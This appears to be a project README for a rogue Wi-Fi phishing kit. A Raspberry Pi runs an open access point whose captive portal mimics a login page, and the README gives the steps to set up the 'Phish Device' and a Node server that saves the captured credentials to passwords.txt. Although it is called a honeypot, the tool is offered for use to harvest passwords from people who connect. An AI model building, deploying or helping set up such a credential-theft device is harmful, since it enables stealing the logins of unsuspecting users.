# Description
This quickly sets up a honeypot for passwords for the user. For example if we install this on a raspberry pi, we can
power the device with a battery and connect the device to an ethernet port. The raspberry pi will create an open wifi
connection that is bridged with the ethernet connection, however will not allow the user to use the internet until
it goes through a captive portal. The captive portal mimics a user login page and then allows the user to use the internet

# Folder Structure
`/client` holds the captive portal page design
`/server` holds the server code to capture logins.
`start.sh` is a script used to setup the access point and captive portal on the raspberry pi

Prerequisites -
- Rasberry pi 3 or 3B
- MicroSD card 4gb or greater
- Raspbian 9 installed on SD card

The auto installation script to install the access point and captive portal from nodogsplash is in start.sh

Install Guide Phish Device (raspberry pi)
 - Clone Repo and enter directory
 - Open `index.html` in client and change the
 - Run `chmod +x start.sh`
 - Run `./start.sh`
 - Move your custom html page or move `/client/index.html' to `/etc/nodogsplash/htdocs/splash.html`
 - Make sure your html file or our `index.html` has their servername set to the Server ip address.


 Install Guide Server (phish destination)
  - Run `npm install` in the `/server/` directory
  - Run `node index.js` to run the Server

  When clients login it will send the credentials to the server, and the server will save the logins under passwords.txt
